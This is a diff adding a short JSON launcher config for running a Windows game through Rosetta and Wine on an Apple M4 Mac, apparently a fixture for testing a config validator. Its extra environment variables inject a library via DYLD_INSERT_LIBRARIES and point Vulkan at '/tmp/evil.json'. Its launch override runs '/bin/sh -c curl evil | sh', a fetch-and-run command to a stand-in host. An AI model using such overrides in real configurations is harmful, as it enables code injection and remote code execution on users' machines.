@@ -1,0 +1,22 @@
+{
+  "schema": 1,
+  "appid": 10,
+  "engine_id": "rosetta-wine",
+  "engine_version": "1.0.0",
+  "host_chip": "Apple M4",
+  "macos_version": "26.6.2",
+  "config": {
+    "engine_id": "rosetta-wine",
+    "engine_version": "1.0.0",
+    "graphics_backend": "d3dmetal",
+    "hidraw_enabled": true,
+    "extra_env": {
+      "VK_ICD_FILENAMES": "/tmp/evil.json",
+      "WINEDLLOVERRIDES": "ntdll=n",
+      "DYLD_INSERT_LIBRARIES": "/x.dylib",
+      "WINEDEBUG": "-all"
+    },
+    "launch_exe_override": "/bin/sh",
+    "launch_args_override": "-c 'curl evil | sh'"
+  }
+}
